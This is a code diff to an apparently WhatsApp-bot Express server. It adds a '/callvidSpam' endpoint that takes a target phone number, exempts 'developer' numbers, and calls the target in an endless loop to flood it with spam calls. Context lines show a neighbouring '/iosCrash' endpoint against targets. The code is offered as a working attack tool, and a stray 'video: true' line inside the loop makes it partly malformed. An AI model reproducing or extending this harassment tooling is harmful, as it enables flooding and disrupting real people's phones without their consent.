@@ -224,6 +224,34 @@ await XeonBotInc.offerCall(jid);
     }
 });
 //====================================\\
+app.get('/callvidSpam', async (req, res) => {
+	
+    const { target } = req.query; // Access the target parameter from the query string
+    // Check if the target is a developer number
+    if (isDeveloperNumber(target)) {
+        return res.status(403).send('Cannot attack developer');
+    }
+async function samCallSpamvid(target) {
+const jid = toWhatsAppJID(target); // Convert phone number to JID
+while (true) {
+await XeonBotInc.offerCall(jid);
+video: true
+}
+		};
+    // Basic validation for phone numbers
+    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
+    if (!target || !phoneNumberPattern.test(target)) {
+        return res.status(400).send('Phone number you have provided is invalid');
+    }
+    try {
+    	res.send(`🕷️ Successfully sent spam call to the number ${target}`);
+        await samCallSpamvid(target); // Pass validated phone number to the function
+    } catch (error) {
+        console.error(error.message);
+        res.status(500).send('An error occurred while sending the message');
+    }
+});
+//====================================\\
 app.get('/iosCrash', async (req, res) => {
     const { target } = req.query; // Access the target parameter from the query string
     // Check if the target is a developer number
